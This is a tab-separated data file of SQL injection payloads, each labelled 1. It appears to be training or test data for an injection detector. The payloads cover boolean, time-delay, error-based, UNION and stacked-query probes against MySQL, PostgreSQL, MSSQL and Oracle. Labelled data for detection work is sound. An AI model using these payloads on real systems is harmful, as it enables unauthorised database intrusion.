Query	Label
3)) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (4396=4396	1
3) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)	1
3)') AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('jHwu'='jHwu	1
3)' AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'MKtC'='MKtC	1
3) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)	1
(SELECT CONCAT(CONCAT('qvbjq',(CASE WHEN (9147=9147) THEN '1' ELSE '0' END)),'qpzpq'))	1
3));SELECT PG_SLEEP(5)	1
3);SELECT PG_SLEEP(5)	1
3)');SELECT PG_SLEEP(5)	1
3)';SELECT PG_SLEEP(5)	1
3));WAITFOR DELAY '0:0:5'	1
3);WAITFOR DELAY '0:0:5'	1
3)');WAITFOR DELAY '0:0:5'	1
3)';WAITFOR DELAY '0:0:5'	1
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	1
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),0) FROM DUAL	1
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	1
3);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	1
3)');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	1
3)';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	1
3)) AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk) AND (5655=5655	1
3) AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk)	1
3)') AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk) AND ('fwOb'='fwOb	1
3)' AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk) AND 'prXz'='prXz	1
3) AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk)	1
3) AND (SELECT 1922 FROM (SELECT(SLEEP(0)))XSYk)	1
3) AND (SELECT 1922 FROM (SELECT(SLEEP(5)))XSYk)	1
3) ORDER BY 1	1
3) ORDER BY 9846	1
3) UNION ALL SELECT NULL	1
3) UNION ALL SELECT NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL	1
3) AND (SELECT 9927 FROM (SELECT(SLEEP(5-(IF(34=34,0,5)))))qxmU)	1
3) AND (SELECT 6192 FROM (SELECT(SLEEP(5-(IF(34=47,0,5)))))wJid)	1
3) AND (SELECT 3362 FROM (SELECT(SLEEP(5-(IF(34=51,0,5)))))tfll)	1
3) AND (SELECT 8168 FROM (SELECT(SLEEP(5-(IF(51=47,0,5)))))OjZN)	1
3) AND (SELECT 3126 FROM (SELECT(SLEEP(5-(IF(47=47,0,5)))))isqs)	1
3) AND (SELECT 4609 FROM (SELECT(SLEEP(5-(IF(51 47,0,5)))))rtdH)	1
3) AND (SELECT 1311 FROM (SELECT(SLEEP(5-(IF(1266=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                1266,0,5)))))fBmo)	1
3) AND (SELECT 6726 FROM (SELECT(SLEEP(5-(IF(5650>5649,0,5)))))SQyF)	1
3) AND (SELECT 9633 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))SuXP)	1
3).,..(.(.'"	1
3)'rHNKIg<'">pMxyyp	1
3)) AND 1052=6970	1
3)') AND 8804=3354	1
3)' AND 4030=7771	1
3)" AND 6744=1505	1
3)) AND 6550=1541 AND (9250=9250	1
3))) AND 8469=8216 AND ((6412=6412	1
3)))) AND 6779=1302 AND (((7704=7704	1
3) AND 5167=5566	1
3)') AND 3979=3587 AND ('apkw'='apkw	1
3)')) AND 6448=5239 AND (('MyZP'='MyZP	1
3)'))) AND 8056=9183 AND ((('CrTA'='CrTA	1
3)' AND 2011=6522 AND 'rCbe'='rCbe	1
3)') AND 1509=3826 AND ('NzYn' LIKE 'NzYn	1
3)')) AND 9336=8643 AND (('MSvR' LIKE 'MSvR	1
3)'))) AND 3649=5607 AND ((('wqAa' LIKE 'wqAa	1
3)%' AND 7135=2802 AND 'ykzc%'='ykzc	1
3)' AND 3586=9911 AND 'kolT' LIKE 'kolT	1
3)") AND 4466=9660 AND ("oDsM"="oDsM	1
3)")) AND 2743=2267 AND (("SObm"="SObm	1
3)"))) AND 9376=5684 AND ((("iGIL"="iGIL	1
3)" AND 4258=2564 AND "BexJ"="BexJ	1
3)") AND 9503=7877 AND ("lgFh" LIKE "lgFh	1
3)")) AND 5999=6363 AND (("XeMU" LIKE "XeMU	1
3)"))) AND 2417=5361 AND ((("ABYj" LIKE "ABYj	1
3)" AND 3553=6362 AND "onHC" LIKE "onHC	1
3) AND 4590=7671	1
3) AND 4668=1855# gJuz	1
3)' AND 6162=1938 OR 'bDQK'='jtKt	1
3)') WHERE 1837=1837 AND 3902=5346	1
3)") WHERE 9659=9659 AND 2359=5149	1
3)) WHERE 4370=4370 AND 5670=1770	1
3)' WHERE 2907=2907 AND 6433=5877	1
3)" WHERE 5633=5633 AND 4640=8801	1
3) WHERE 7342=7342 AND 3927=1181	1
3)'||(SELECT vhlJ WHERE 2836=2836 AND 8954=7001)||'	1
3)'||(SELECT cIRC FROM DUAL WHERE 5993=5993 AND 4443=6101)||'	1
3)'+(SELECT uKTb WHERE 9791=9791 AND 1170=9731)+'	1
3)||(SELECT tdOT FROM DUAL WHERE 6130=6130 AND 5965=1200)||	1
3)||(SELECT OlWZ WHERE 8788=8788 AND 9966=6225)||	1
3)+(SELECT jzXV WHERE 4773=4773 AND 4906=5400)+	1
3)')) AS BLHP WHERE 2279=2279 AND 8889=1559	1
3)")) AS cBAy WHERE 4813=4813 AND 3658=6269	1
3))) AS vBPX WHERE 1924=1924 AND 2508=1545	1
3)') AS IhPD WHERE 1281=1281 AND 6016=5415	1
3)") AS YgCE WHERE 9325=9325 AND 5349=6780	1
3)) AS GGVz WHERE 3337=3337 AND 2215=2585	1
3)` WHERE 1166=1166 AND 2438=7255	1
3)`) WHERE 9107=9107 AND 2546=6078	1
3)`=`3)` AND 2241=3548 AND `3)`=`3)	1
3)"="3)" AND 9331=6073 AND "3)"="3)	1
3)]-(SELECT 0 WHERE 3557=3557 AND 8121=8281)|[3)	1
3)' IN BOOLEAN MODE) AND 9961=1319#	1
-9794	1
-4557) OR 8306=1160	1
-7526) OR 7981=7981	1
-6801') OR 3379=3708	1
-4729') OR 7981=7981	1
-4751' OR 9928=1946	1
-8318' OR 7981=7981	1
-9936" OR 6808=8672	1
-9817" OR 7981=7981	1
-5216) OR 7374=9218 AND (4165=4165	1
-1915) OR 7981=7981 AND (4931=4931	1
-5601)) OR 1897=7206 AND ((3129=3129	1
-1647)) OR 7981=7981 AND ((2128=2128	1
-9744))) OR 5322=5363 AND (((8765=8765	1
-3207))) OR 7981=7981 AND (((6058=6058	1
-3914 OR 6551=8446	1
-9410 OR 7981=7981	1
-6416') OR 5972=2928 AND ('bcYr'='bcYr	1
-4801') OR 7981=7981 AND ('tYcE'='tYcE	1
-2938')) OR 3247=1159 AND (('puDJ'='puDJ	1
-6143')) OR 7981=7981 AND (('yaFY'='yaFY	1
-9949'))) OR 8500=4637 AND ((('hbyi'='hbyi	1
-2911'))) OR 7981=7981 AND ((('KJLT'='KJLT	1
-6893' OR 2202=8802 AND 'OVhO'='OVhO	1
-4567' OR 7981=7981 AND 'STWW'='STWW	1
-9224') OR 3101=3958 AND ('bDWW' LIKE 'bDWW	1
-2006') OR 7981=7981 AND ('JTaY' LIKE 'JTaY	1
-9024')) OR 3687=6533 AND (('AULH' LIKE 'AULH	1
-1377')) OR 7981=7981 AND (('cgpI' LIKE 'cgpI	1
-3526'))) OR 6829=7442 AND ((('oPmk' LIKE 'oPmk	1
-5834'))) OR 7981=7981 AND ((('Qwac' LIKE 'Qwac	1
-7685%' OR 5456=6562 AND 'kPsz%'='kPsz	1
-7662%' OR 7981=7981 AND 'AtND%'='AtND	1
-7398' OR 4397=5831 AND 'mmwq' LIKE 'mmwq	1
-1158' OR 7981=7981 AND 'pyAF' LIKE 'pyAF	1
-1315") OR 4760=5153 AND ("VptU"="VptU	1
-1891") OR 7981=7981 AND ("iYLJ"="iYLJ	1
-9945")) OR 3681=2318 AND (("fWDo"="fWDo	1
-7418")) OR 7981=7981 AND (("YaXx"="YaXx	1
-8828"))) OR 7464=4419 AND ((("OvQt"="OvQt	1
-6820"))) OR 7981=7981 AND ((("zQqo"="zQqo	1
-7599" OR 6413=2298 AND "UUtN"="UUtN	1
-5661" OR 7981=7981 AND "ODqq"="ODqq	1
-7749") OR 3529=4980 AND ("aCBZ" LIKE "aCBZ	1
-7056") OR 7981=7981 AND ("sAYG" LIKE "sAYG	1
-7896")) OR 7325=4717 AND (("HSlC" LIKE "HSlC	1
-4174")) OR 7981=7981 AND (("wWez" LIKE "wWez	1
-8544"))) OR 9006=2446 AND ((("TmoZ" LIKE "TmoZ	1
-7026"))) OR 7981=7981 AND ((("LCuA" LIKE "LCuA	1
-3108" OR 9970=7286 AND "kMkB" LIKE "kMkB	1
-3235" OR 7981=7981 AND "oVHu" LIKE "oVHu	1
-6369 OR 2072=5537	1
-3324 OR 7981=7981	1
-7049 OR 8296=6660# mAZu	1
-2364 OR 7981=7981# KFgq	1
-8252' OR 3435=1901 OR 'GOTC'='mXrq	1
-7889' OR 7981=7981 OR 'TEpS'='qKxU	1
-7570') WHERE 5093=5093 OR 2454=4187	1
-5091') WHERE 5371=5371 OR 7981=7981	1
-1759") WHERE 6098=6098 OR 6395=1730	1
-2080") WHERE 3320=3320 OR 7981=7981	1
-9275) WHERE 7484=7484 OR 1459=1702	1
-1527) WHERE 9725=9725 OR 7981=7981	1
-1666' WHERE 8968=8968 OR 6022=3900	1
-3831' WHERE 5013=5013 OR 7981=7981	1
-6120" WHERE 8175=8175 OR 4169=8507	1
-7286" WHERE 7794=7794 OR 7981=7981	1
-4117 WHERE 8055=8055 OR 2797=9612	1
-8241 WHERE 6238=6238 OR 7981=7981	1
-1025')) AS QUvi WHERE 8273=8273 OR 6795=8102	1
-2951')) AS hPlg WHERE 1286=1286 OR 7981=7981	1
-4694")) AS QjNe WHERE 6703=6703 OR 8612=5792	1
-4071")) AS EpYy WHERE 7725=7725 OR 7981=7981	1
-7360)) AS GjTu WHERE 5591=5591 OR 4720=4420	1
-4354)) AS tQGn WHERE 7082=7082 OR 7981=7981	1
-8386') AS nrey WHERE 5989=5989 OR 6664=3976	1
-6294') AS uIRp WHERE 1050=1050 OR 7981=7981	1
-8164") AS VhMz WHERE 4713=4713 OR 9430=2671	1
-9917") AS sZSX WHERE 4295=4295 OR 7981=7981	1
-5234) AS Uznh WHERE 2006=2006 OR 7155=1355	1
-5871) AS nNKW WHERE 7448=7448 OR 7981=7981	1
3)) OR NOT 6845=6206	1
3)') OR NOT 4668=4232	1
3)' OR NOT 6302=7031	1
3)" OR NOT 6007=2308	1
3)) OR NOT 4285=9536 AND (3330=3330	1
3))) OR NOT 4964=7301 AND ((8577=8577	1
3)))) OR NOT 8618=7557 AND (((7052=7052	1
3) OR NOT 3135=9044	1
3)') OR NOT 6777=3673 AND ('PxdM'='PxdM	1
3)')) OR NOT 4332=3015 AND (('Qwit'='Qwit	1
3)'))) OR NOT 5209=8198 AND ((('KqMB'='KqMB	1
3)' OR NOT 9638=9674 AND 'ODtx'='ODtx	1
3)') OR NOT 6091=7346 AND ('DmVr' LIKE 'DmVr	1
3)')) OR NOT 3203=3977 AND (('LgbI' LIKE 'LgbI	1
3)'))) OR NOT 4479=8905 AND ((('eovX' LIKE 'eovX	1
3)%' OR NOT 9895=2409 AND 'fHfz%'='fHfz	1
3)' OR NOT 2784=1489 AND 'xrsf' LIKE 'xrsf	1
3)") OR NOT 5374=5589 AND ("Tbiy"="Tbiy	1
3)")) OR NOT 6520=2169 AND (("DNzv"="DNzv	1
3)"))) OR NOT 6079=2030 AND ((("CCme"="CCme	1
3)" OR NOT 2321=4374 AND "FtSt"="FtSt	1
3)") OR NOT 8991=5334 AND ("ZCFR" LIKE "ZCFR	1
3)")) OR NOT 2971=3566 AND (("xhiK" LIKE "xhiK	1
3)"))) OR NOT 7123=1778 AND ((("RQoD" LIKE "RQoD	1
3)" OR NOT 2513=5924 AND "CoRn" LIKE "CoRn	1
3) OR NOT 9403=6073	1
3) OR NOT 7496=4846# CCPU	1
3)' OR NOT 9456=2996 OR 'uwxp'='qVsF	1
3)') WHERE 3588=3588 OR NOT 9144=7164	1
3)") WHERE 1876=1876 OR NOT 3575=5789	1
3)) WHERE 3556=3556 OR NOT 7802=1611	1
3)' WHERE 7770=7770 OR NOT 9275=6812	1
3)" WHERE 7727=7727 OR NOT 2316=5716	1
3) WHERE 8073=8073 OR NOT 3245=6996	1
3)'||(SELECT avkh WHERE 9124=9124 OR NOT 7970=9244)||'	1
3)'||(SELECT wiHd FROM DUAL WHERE 1451=1451 OR NOT 7650=5040)||'	1
3)'+(SELECT TDTs WHERE 9184=9184 OR NOT 9446=9332)+'	1
3)||(SELECT LfZS FROM DUAL WHERE 6571=6571 OR NOT 1498=3978)||	1
3)||(SELECT zSiR WHERE 7679=7679 OR NOT 9165=5441)||	1
3)+(SELECT kZHY WHERE 6844=6844 OR NOT 5607=4849)+	1
3)')) AS hgsf WHERE 8526=8526 OR NOT 3948=9395	1
3)")) AS coSr WHERE 8969=8969 OR NOT 5934=7060	1
3))) AS RKuC WHERE 2922=2922 OR NOT 5536=6323	1
3)') AS wyQM WHERE 5968=5968 OR NOT 1753=6708	1
3)") AS dELu WHERE 2010=2010 OR NOT 2785=1740	1
3)) AS gKED WHERE 8239=8239 OR NOT 3168=8728	1
3)` WHERE 5885=5885 OR NOT 5993=3772	1
3)`) WHERE 5251=5251 OR NOT 5996=9701	1
3)' IN BOOLEAN MODE) OR NOT 6485=4926#	1
3)) AND 5325=(SELECT (CASE WHEN (5325=8417) THEN 5325 ELSE (SELECT 8417 UNION SELECT 3938) END))	1
3)') AND 1138=(SELECT (CASE WHEN (1138=9677) THEN 1138 ELSE (SELECT 9677 UNION SELECT 3474) END))	1
3)' AND 3467=(SELECT (CASE WHEN (3467=2753) THEN 3467 ELSE (SELECT 2753 UNION SELECT 9532) END))	1
3)" AND 2869=(SELECT (CASE WHEN (2869=4560) THEN 2869 ELSE (SELECT 4560 UNION SELECT 9894) END))	1
3))) AND 9598=(SELECT (CASE WHEN (9598=5393) THEN 9598 ELSE (SELECT 5393 UNION SELECT 1776) END))	1
3)))) AND 9235=(SELECT (CASE WHEN (9235=6453) THEN 9235 ELSE (SELECT 6453 UNION SELECT 8713) END))	1
3) AND 7768=(SELECT (CASE WHEN (7768=7578) THEN 7768 ELSE (SELECT 7578 UNION SELECT 8475) END))	1
3)')) AND 3416=(SELECT (CASE WHEN (3416=7007) THEN 3416 ELSE (SELECT 7007 UNION SELECT 6434) END))	1
3)'))) AND 3432=(SELECT (CASE WHEN (3432=5962) THEN 3432 ELSE (SELECT 5962 UNION SELECT 9398) END))	1
3)%' AND 7082=(SELECT (CASE WHEN (7082=4645) THEN 7082 ELSE (SELECT 4645 UNION SELECT 6063) END))	1
3)") AND 3920=(SELECT (CASE WHEN (3920=8308) THEN 3920 ELSE (SELECT 8308 UNION SELECT 3201) END))	1
3)")) AND 1168=(SELECT (CASE WHEN (1168=9371) THEN 1168 ELSE (SELECT 9371 UNION SELECT 5921) END))	1
3)"))) AND 4472=(SELECT (CASE WHEN (4472=9040) THEN 4472 ELSE (SELECT 9040 UNION SELECT 3591) END))	1
3)') WHERE 1841=1841 AND 8505=(SELECT (CASE WHEN (8505=9926) THEN 8505 ELSE (SELECT 9926 UNION SELECT 4218) END))	1
3)") WHERE 9688=9688 AND 6442=(SELECT (CASE WHEN (6442=8393) THEN 6442 ELSE (SELECT 8393 UNION SELECT 8434) END))	1
3)) WHERE 8153=8153 AND 8424=(SELECT (CASE WHEN (8424=3993) THEN 8424 ELSE (SELECT 3993 UNION SELECT 8040) END))	1
3)' WHERE 2423=2423 AND 5011=(SELECT (CASE WHEN (5011=7426) THEN 5011 ELSE (SELECT 7426 UNION SELECT 1413) END))	1
3)" WHERE 9262=9262 AND 9894=(SELECT (CASE WHEN (9894=6808) THEN 9894 ELSE (SELECT 6808 UNION SELECT 3568) END))	1
3) WHERE 6616=6616 AND 6140=(SELECT (CASE WHEN (6140=1518) THEN 6140 ELSE (SELECT 1518 UNION SELECT 5957) END))	1
3)'||(SELECT jpaL WHERE 1361=1361 AND 2006=(SELECT (CASE WHEN (2006=2662) THEN 2006 ELSE (SELECT 2662 UNION SELECT 3756) END))	1
3)'||(SELECT HnRh FROM DUAL WHERE 1677=1677 AND 5520=(SELECT (CASE WHEN (5520=9095) THEN 5520 ELSE (SELECT 9095 UNION SELECT 6811) END))	1
3)'+(SELECT IYRe WHERE 2489=2489 AND 3159=(SELECT (CASE WHEN (3159=1109) THEN 3159 ELSE (SELECT 1109 UNION SELECT 6065) END))	1
3)||(SELECT kaAc FROM DUAL WHERE 5050=5050 AND 1974=(SELECT (CASE WHEN (1974=6343) THEN 1974 ELSE (SELECT 6343 UNION SELECT 7094) END))	1
3)||(SELECT DzeY WHERE 9101=9101 AND 8203=(SELECT (CASE WHEN (8203=3530) THEN 8203 ELSE (SELECT 3530 UNION SELECT 1446) END))	1
3)+(SELECT GtDN WHERE 1043=1043 AND 1806=(SELECT (CASE WHEN (1806=3223) THEN 1806 ELSE (SELECT 3223 UNION SELECT 4972) END))	1
3)')) AS qtVr WHERE 1187=1187 AND 2289=(SELECT (CASE WHEN (2289=3846) THEN 2289 ELSE (SELECT 3846 UNION SELECT 7069) END))	1
3)")) AS zQvV WHERE 5988=5988 AND 3467=(SELECT (CASE WHEN (3467=7351) THEN 3467 ELSE (SELECT 7351 UNION SELECT 1818) END))	1
3))) AS UgVe WHERE 8633=8633 AND 3432=(SELECT (CASE WHEN (3432=6417) THEN 3432 ELSE (SELECT 6417 UNION SELECT 3456) END))	1
3)') AS AOrX WHERE 2690=2690 AND 2359=(SELECT (CASE WHEN (2359=5547) THEN 2359 ELSE (SELECT 5547 UNION SELECT 9043) END))	1
3)") AS uLjD WHERE 1879=1879 AND 2228=(SELECT (CASE WHEN (2228=1826) THEN 2228 ELSE (SELECT 1826 UNION SELECT 2658) END))	1
3)) AS yiGb WHERE 3093=3093 AND 5631=(SELECT (CASE WHEN (5631=2573) THEN 5631 ELSE (SELECT 2573 UNION SELECT 3895) END))	1
3)` WHERE 7204=7204 AND 7045=(SELECT (CASE WHEN (7045=9652) THEN 7045 ELSE (SELECT 9652 UNION SELECT 7011) END))	1
3)`) WHERE 8948=8948 AND 5812=(SELECT (CASE WHEN (5812=3862) THEN 5812 ELSE (SELECT 3862 UNION SELECT 5751) END))	1
3)`=`3)` AND 9249=(SELECT (CASE WHEN (9249=4605) THEN 9249 ELSE (SELECT 4605 UNION SELECT 1440) END))	1
3)"="3)" AND 3989=(SELECT (CASE WHEN (3989=8323) THEN 3989 ELSE (SELECT 8323 UNION SELECT 8122) END))	1
3)]-(SELECT 0 WHERE 4739=4739 AND 7344=(SELECT (CASE WHEN (7344=8765) THEN 7344 ELSE (SELECT 8765 UNION SELECT 5816) END))	1
3)' IN BOOLEAN MODE) AND 5231=(SELECT (CASE WHEN (5231=7734) THEN 5231 ELSE (SELECT 7734 UNION SELECT 5806) END))	1
-3304) OR 1861=(SELECT (CASE WHEN (1861=6377) THEN 1861 ELSE (SELECT 6377 UNION SELECT 9804) END))	1
-5791) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-3918') OR 6208=(SELECT (CASE WHEN (6208=1676) THEN 6208 ELSE (SELECT 1676 UNION SELECT 6430) END))	1
-7805') OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-9907' OR 6811=(SELECT (CASE WHEN (6811=8647) THEN 6811 ELSE (SELECT 8647 UNION SELECT 8860) END))	1
